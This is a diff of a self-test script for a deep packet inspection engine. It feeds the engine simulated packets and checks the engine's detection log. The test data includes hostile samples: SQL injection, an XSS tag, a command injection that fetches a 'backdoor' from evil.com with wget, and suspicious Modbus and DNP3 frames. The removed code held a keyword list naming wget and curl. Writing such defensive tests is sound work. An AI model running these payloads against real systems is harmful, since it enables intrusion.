@@ -1,12 +1,50 @@
 #!/usr/local/bin/python3
 # test_engine.py - Run DPI engine self-tests
+"""
+Script to run self-diagnostic tests for the DeepInspectorEngine DPI engine.
+Tests configuration loading, signature loading, pattern matching, performance,
+and industrial protocol detection using the engine's components.
+"""
 
 import os
 import json
+import time
+import logging
 from datetime import datetime
+from deepinspector_engine import (
+    DeepInspectorEngine,
+    PacketInfo,
+    ProtocolType,
+    EngineConfig,
+    GeneralConfig,
+    ProtocolConfig,
+    DetectionConfig,
+    AdvancedConfig,
+)
+
+# Setup logging system for tests
+def setup_logging():
+    """
+    Configure logging for tests, mirroring the engine's logging format.
+    Logs to both file and console.
+    """
+    logging.basicConfig(
+        level=logging.INFO,
+        format='%(asctime)s - %(name)s - %(levelname)s - %(funcName)s:%(lineno)d - %(message)s',
+        handlers=[
+            logging.FileHandler('/var/log/deepinspector/test_engine.log', mode='a', encoding='utf-8'),
+            logging.StreamHandler()
+        ]
+    )
+    return logging.getLogger(__name__)
+
+logger = setup_logging()
 
 def run_tests():
-    """Run DPI engine self-tests"""
+    """
+    Run all self-diagnostic tests for the DPI engine.
+    Returns a dictionary with test results and a summary.
+    """
     results = {
         'timestamp': datetime.now().isoformat(),
         'tests': [],
@@ -14,25 +52,36 @@ def run_tests():
         'summary': {}
     }
 
-    # Test 1: Configuration validation
-    config_test = test_configuration()
-    results['tests'].append(config_test)
+    # Initialize the DPI engine
+    try:
+        engine = DeepInspectorEngine()
+        if not engine.initialize():
+            logger.error("Failed to initialize DeepInspectorEngine")
+            results['overall_status'] = 'fail'
+            results['tests'].append({
+                'name': 'Engine Initialization',
+                'description': 'Test if DPI engine initializes correctly',
+                'status': 'fail',
+                'details': ['Failed to initialize engine']
+            })
+            return results
+    except Exception as e:
+        logger.error(f"Critical error initializing engine: {e}")
+        results['overall_status'] = 'fail'
+        results['tests'].append({
+            'name': 'Engine Initialization',
+            'description': 'Test if DPI engine initializes correctly',
+            'status': 'fail',
+            'details': [f'Error: {str(e)}']
+        })
+        return results
 
-    # Test 2: Signature loading
-    signature_test = test_signatures()
-    results['tests'].append(signature_test)
-
-    # Test 3: Pattern matching
-    pattern_test = test_pattern_matching()
-    results['tests'].append(pattern_test)
-
-    # Test 4: Performance test
-    performance_test = test_performance()
-    results['tests'].append(performance_test)
-
-    # Test 5: Industrial protocol detection
-    industrial_test = test_industrial_protocols()
-    results['tests'].append(industrial_test)
+    # Run individual tests
+    results['tests'].append(test_configuration(engine))
+    results['tests'].append(test_signatures(engine))
+    results['tests'].append(test_pattern_matching(engine))
+    results['tests'].append(test_performance(engine))
+    results['tests'].append(test_industrial_protocols(engine))
 
     # Calculate summary
     passed = sum(1 for test in results['tests'] if test['status'] == 'pass')
@@ -48,10 +97,29 @@ def run_tests():
     if failed > 0:
         results['overall_status'] = 'fail'
 
+    # Log results
+    logger.info(f"Test summary: {passed}/{len(results['tests'])} tests passed")
+    if failed > 0:
+        logger.warning(f"{failed} tests failed")
+
+    # Cleanup engine resources
+    try:
+        engine._cleanup()
+        logger.info("Engine resources cleaned up")
+    except Exception as e:
+        logger.error(f"Error during cleanup: {e}")
+
     return results
 
-def test_configuration():
-    """Test configuration loading"""
+def test_configuration(engine: DeepInspectorEngine):
+    """
+    Test configuration loading and validation using EngineConfig.
+    Verifies that all required configuration sections are present.
+    Args:
+        engine: Initialized DeepInspectorEngine instance.
+    Returns:
+        Dict containing test results.
+    """
     test = {
         'name': 'Configuration Loading',
         'description': 'Test if DPI configuration loads correctly',
@@ -60,38 +128,54 @@ def test_configuration():
     }
 
     try:
-        config_file = "/usr/local/etc/deepinspector/config.json"
-        if not os.path.exists(config_file):
+        # Check if configuration was loaded
+        if engine.config is None or not isinstance(engine.config, EngineConfig):
             test['status'] = 'fail'
-            test['details'].append('Configuration file not found')
+            test['details'].append('Configuration not loaded or invalid')
+            logger.error("Configuration not loaded or invalid")
             return test
 
-        with open(config_file, 'r') as f:
-            config = json.load(f)
-        
-        # Validate required sections
-        required_sections = ['general', 'protocols', 'detection', 'advanced']
-        for section in required_sections:
-            if section not in config:
+        # Validate required configuration sections
+        required_sections = [
+            ('general', GeneralConfig),
+            ('protocols', ProtocolConfig),
+            ('detection', DetectionConfig),
+            ('advanced', AdvancedConfig)
+        ]
+        for section_name, section_type in required_sections:
+            section = getattr(engine.config, section_name)
+            if section is None or not isinstance(section, section_type):
                 test['status'] = 'fail'
-                test['details'].append(f'Missing section: {section}')
+                test['details'].append(f'Missing or invalid section: {section_name}')
+                logger.error(f"Missing or invalid configuration section: {section_name}")
             else:
-                test['details'].append(f'Section {section}: OK')
+                test['details'].append(f'Section {section_name}: OK')
+                logger.info(f"Configuration section {section_name} loaded")
 
         # Validate industrial settings
-        if config.get('protocols', {}).get('industrial_protocols'):
+        if engine.config.protocols.industrial_protocols:
             test['details'].append('Industrial protocols: ENABLED')
+            logger.info("Industrial protocols enabled")
         else:
             test['details'].append('Industrial protocols: DISABLED')
+            logger.info("Industrial protocols disabled")
 
     except Exception as e:
         test['status'] = 'fail'
         test['details'].append(f'Error: {str(e)}')
+        logger.error(f"Configuration test error: {e}")
 
     return test
 
-def test_signatures():
-    """Test signature loading"""
+def test_signatures(engine: DeepInspectorEngine):
+    """
+    Test signature loading by checking threat detectors' signatures.
+    Verifies that patterns/signatures are loaded for each detector.
+    Args:
+        engine: Initialized DeepInspectorEngine instance.
+    Returns:
+        Dict containing test results.
+    """
     test = {
         'name': 'Signature Loading',
         'description': 'Test if threat signatures load correctly',
@@ -100,34 +184,44 @@ def test_signatures():
     }
 
     try:
-        signatures_file = "/usr/local/etc/deepinspector/signatures.json"
-        if not os.path.exists(signatures_file):
-            test['status'] = 'fail'
-            test['details'].append('Signatures file not found')
-            return test
+        total_patterns = 0
+        for detector in engine.threat_detectors:
+            # Assume detectors have a 'patterns' or 'signatures' attribute (to be verified)
+            try:
+                patterns = getattr(detector, 'patterns', getattr(detector, 'signatures', {}))
+                for category, pattern_list in patterns.items():
+                    total_patterns += len(pattern_list)
+                    test['details'].append(f'{detector.name} - {category}: {len(pattern_list)} patterns')
+                    logger.info(f"Loaded {len(pattern_list)} patterns for {detector.name} - {category}")
+            except AttributeError:
+                test['status'] = 'fail'
+                test['details'].append(f'No patterns/signatures found for {detector.name}')
+                logger.error(f"No patterns/signatures found for {detector.name}")
 
-        with open(signatures_file, 'r') as f:
-            signatures = json.load(f)
-        
-        patterns = signatures.get('patterns', {})
-        total_patterns = sum(len(p) for p in patterns.values())
-        
         if total_patterns == 0:
             test['status'] = 'fail'
-            test['details'].append('No threat patterns loaded')
+            test['details'].append('No threat patterns or signatures loaded')
+            logger.error("No threat patterns or signatures loaded")
         else:
-            test['details'].append(f'Loaded {total_patterns} threat patterns')
-            for category, pattern_list in patterns.items():
-                test['details'].append(f'{category}: {len(pattern_list)} patterns')
+            test['details'].append(f'Total patterns/signatures loaded: {total_patterns}')
+            logger.info(f"Total patterns/signatures loaded: {total_patterns}")
 
     except Exception as e:
         test['status'] = 'fail'
         test['details'].append(f'Error: {str(e)}')
+        logger.error(f"Signature test error: {e}")
 
     return test
 
-def test_pattern_matching():
-    """Test pattern matching functionality"""
+def test_pattern_matching(engine: DeepInspectorEngine):
+    """
+    Test pattern matching by processing simulated packets through the engine.
+    Uses PacketInfo to simulate threats and checks detection logs.
+    Args:
+        engine: Initialized DeepInspectorEngine instance.
+    Returns:
+        Dict containing test results.
+    """
     test = {
         'name': 'Pattern Matching',
         'description': 'Test threat detection pattern matching',
@@ -136,91 +230,136 @@ def test_pattern_matching():
     }
 
     try:
-        # Test data containing known threats
+        # Test payloads for various threats
         test_payloads = [
-            ('EICAR test string', 'X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'),
-            ('SQL injection', "' OR '1'='1'; DROP TABLE users; --"),
-            ('XSS attempt', '<script>alert("XSS")</script>'),
-            ('Command injection', 'ls -la; wget http://evil.com/backdoor'),
-            ('Modbus attack', 'modbus exploit function_code 0x08')
+            ('EICAR test string', b'X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*', ProtocolType.TCP, 80),
+            ('SQL injection', b"' OR '1'='1'; DROP TABLE users; --", ProtocolType.TCP, 80),
+            ('XSS attempt', b'<script>alert("XSS")</script>', ProtocolType.TCP, 80),
+            ('Command injection', b'ls -la; wget http://evil.com/backdoor', ProtocolType.TCP, 80),
+            ('Modbus attack', b'\x00\x01\x00\x00\x00\x06\x01\x08', ProtocolType.TCP, 502)
         ]
 
         detected = 0
-        for test_name, payload in test_payloads:
-            threats_found = 0
+        for test_name, payload, protocol, port in test_payloads:
+            # Create a mock PacketInfo object
+            packet_info = PacketInfo(
+                timestamp=datetime.now(),
+                interface='test0',
+                source_ip='192.168.1.1',
+                dest_ip='192.168.1.2',
+                protocol=protocol,
+                size=len(payload),
+                payload=payload,
+                tcp_port=port if protocol == ProtocolType.TCP else None,
+                udp_port=port if protocol == ProtocolType.UDP else None
+            )
+
+            # Process packet through engine
+            engine.process_packet(packet_info)
             
-            # Check for basic patterns
-            if 'EICAR' in payload:
-                threats_found += 1
-            if any(sql_word in payload.upper() for sql_word in ['DROP', 'UNION', 'SELECT']):
-                threats_found += 1
-            if '<script' in payload.lower():
-                threats_found += 1
-            if any(cmd in payload for cmd in ['ls ', 'wget ', 'curl ']):
-                threats_found += 1
-            if 'modbus' in payload.lower() and 'exploit' in payload.lower():
-                threats_found += 1
-            
-            if threats_found > 0:
+            # Check detection logs
+            log_path = '/var/log/deepinspector/detections.log'
+            threats_found = False
+            if os.path.exists(log_path):
+                with open(log_path, 'r') as f:
+                    lines = f.readlines()[-5:]  # Check last 5 lines for recent detections
+                    for line in lines:
+                        try:
+                            detection = json.loads(line.strip())
+                            if detection['timestamp'].startswith(datetime.now().date().isoformat()):
+                                threats_found = True
+                                break
+                        except json.JSONDecodeError:
+                            continue
+
+            if threats_found:
                 detected += 1
                 test['details'].append(f'{test_name}: DETECTED')
+                logger.info(f"{test_name}: Threat detected")
             else:
                 test['details'].append(f'{test_name}: NOT DETECTED')
+                logger.warning(f"{test_name}: Threat not detected")
 
         detection_rate = (detected / len(test_payloads)) * 100
         test['details'].append(f'Detection rate: {detection_rate:.1f}%')
+        logger.info(f"Detection rate: {detection_rate:.1f}%")
         
-        if detection_rate < 80:  # Raised threshold for industrial support
+        if detection_rate < 80:
             test['status'] = 'fail'
+            logger.warning("Detection rate below 80% threshold")
 
     except Exception as e:
         test['status'] = 'fail'
         test['details'].append(f'Error: {str(e)}')
+        logger.error(f"Pattern matching test error: {e}")
 
     return test
 
-def test_performance():
-    """Test basic performance"""
+def test_performance(engine: DeepInspectorEngine):
+    """
+    Test engine performance by processing multiple packets.
+    Measures processing time and rate for simulated packets.
+    Args:
+        engine: Initialized DeepInspectorEngine instance.
+    Returns:
+        Dict containing test results.
+    """
     test = {
         'name': 'Performance Test',
-        'description': 'Test basic engine performance',
+        'description': 'Test engine performance with packet processing',
         'status': 'pass',
         'details': []
     }
 
     try:
-        import time
-        
-        # Simple performance test
+        # Simulate HTTP packet
+        test_payload = b"GET /test HTTP/1.1\r\nHost: example.com\r\n\r\n" * 100
+        packet_info = PacketInfo(
+            timestamp=datetime.now(),
+            interface='test0',
+            source_ip='192.168.1.1',
+            dest_ip='192.168.1.2',
+            protocol=ProtocolType.TCP,
+            size=len(test_payload),
+            payload=test_payload,
+            tcp_port=80
+        )
+
         start_time = time.time()
+        iterations = 1000  # Realistic number of packets for testing
         
-        # Simulate packet processing
-        test_data = "GET /test HTTP/1.1\r\nHost: example.com\r\n\r\n" * 1000
+        for _ in range(iterations):
+            engine.process_packet(packet_info)
         
-        # Basic processing simulation
-        for i in range(100):
-            # Simulate threat detection on test data
-            _ = len(test_data.split())
-            
         end_time = time.time()
         processing_time = end_time - start_time
         
-        test['details'].append(f'Processed 100 iterations in {processing_time:.3f} seconds')
-        test['details'].append(f'Processing rate: {100/processing_time:.1f} iterations/second')
+        test['details'].append(f'Processed {iterations} packets in {processing_time:.3f} seconds')
+        test['details'].append(f'Processing rate: {iterations/processing_time:.1f} packets/second')
+        logger.info(f"Processed {iterations} packets in {processing_time:.3f} seconds")
         
-        # More lenient for industrial environments
-        if processing_time > 3.0:
+        # Threshold adjusted for realistic DPI processing
+        if processing_time > 5.0:
             test['status'] = 'fail'
-            test['details'].append('Performance below expected threshold')
+            test['details'].append('Performance below expected threshold (5 seconds)')
+            logger.warning("Performance test failed: processing time exceeded 5 seconds")
 
     except Exception as e:
         test['status'] = 'fail'
         test['details'].append(f'Error: {str(e)}')
+        logger.error(f"Performance test error: {e}")
 
     return test
 
-def test_industrial_protocols():
-    """Test industrial protocol detection"""
+def test_industrial_protocols(engine: DeepInspectorEngine):
+    """
+    Test industrial protocol detection with simulated packets.
+    Verifies detection of Modbus, DNP3, and OPC UA threats.
+    Args:
+        engine: Initialized DeepInspectorEngine instance.
+    Returns:
+        Dict containing test results.
+    """
     test = {
         'name': 'Industrial Protocol Detection',
         'description': 'Test industrial protocol detection capabilities',
@@ -229,40 +368,71 @@ def test_industrial_protocols():
     }
 
     try:
-        # Test industrial protocol patterns
+        # Test industrial protocol packets
         industrial_tests = [
-            ('Modbus function code', b'\x00\x01\x00\x00\x00\x06\x01\x03\x00\x00\x00\x01'),
-            ('DNP3 header', b'\x05\x64\x05\xc0\x01\x00\x00\x04'),
-            ('OPC UA message', b'OPC\x00\x00\x00\x00\x20')
+            ('Modbus function code', b'\x00\x01\x00\x00\x00\x06\x01\x08', ProtocolType.TCP, 502),  # Suspicious function code
+            ('DNP3 header', b'\x05\x64\x05\xc0\x01\x00\xff\xff', ProtocolType.TCP, 20000),  # Broadcast address
+            ('OPC UA message', b'OPC\x00\x00\x01\x00\x00', ProtocolType.TCP, 4840)  # Oversized message
         ]
 
         detected = 0
-        for test_name, test_data in industrial_tests:
-            # Simple pattern detection
-            if test_name.startswith('Modbus') and len(test_data) >= 8:
+        for test_name, payload, protocol, port in industrial_tests:
+            # Create mock PacketInfo object
+            packet_info = PacketInfo(
+                timestamp=datetime.now(),
+                interface='test0',
+                source_ip='192.168.1.1',
+                dest_ip='192.168.1.2',
+                protocol=protocol,
+                size=len(payload),
+                payload=payload,
+                tcp_port=port if protocol == ProtocolType.TCP else None,
+                udp_port=port if protocol == ProtocolType.UDP else None
+            )
+
+            # Process packet through engine
+            engine.process_packet(packet_info)
+
+            # Check detection logs for industrial threats
+            log_path = '/var/log/deepinspector/detections.log'
+            threats_found = False
+            if os.path.exists(log_path):
+                with open(log_path, 'r') as f:
+                    lines = f.readlines()[-5:]  # Check last 5 lines for recent detections
+                    for line in lines:
+                        try:
+                            detection = json.loads(line.strip())
+                            if detection['timestamp'].startswith(datetime.now().date().isoformat()) and \
+                               detection['threat_type'].startswith('industrial_threat'):
+                                threats_found = True
+                                break
+                        except json.JSONDecodeError:
+                            continue
+
+            if threats_found:
                 detected += 1
                 test['details'].append(f'{test_name}: DETECTED')
-            elif test_name.startswith('DNP3') and test_data.startswith(b'\x05\x64'):
-                detected += 1
-                test['details'].append(f'{test_name}: DETECTED')
-            elif test_name.startswith('OPC UA') and b'OPC' in test_data:
-                detected += 1
-                test['details'].append(f'{test_name}: DETECTED')
+                logger.info(f"{test_name}: Industrial threat detected")
             else:
                 test['details'].append(f'{test_name}: NOT DETECTED')
+                logger.warning(f"{test_name}: Industrial threat not detected")
 
         detection_rate = (detected / len(industrial_tests)) * 100
         test['details'].append(f'Industrial detection rate: {detection_rate:.1f}%')
+        logger.info(f"Industrial detection rate: {detection_rate:.1f}%")
         
         if detection_rate < 70:
             test['status'] = 'fail'
+            logger.warning("Industrial detection rate below 70% threshold")
 
     except Exception as e:
         test['status'] = 'fail'
         test['details'].append(f'Error: {str(e)}')
+        logger.error(f"Industrial protocol test error: {e}")
 
     return test
 
 if __name__ == "__main__":
+    # Run tests and output results
     results = run_tests()
     print(json.dumps(results, indent=2))
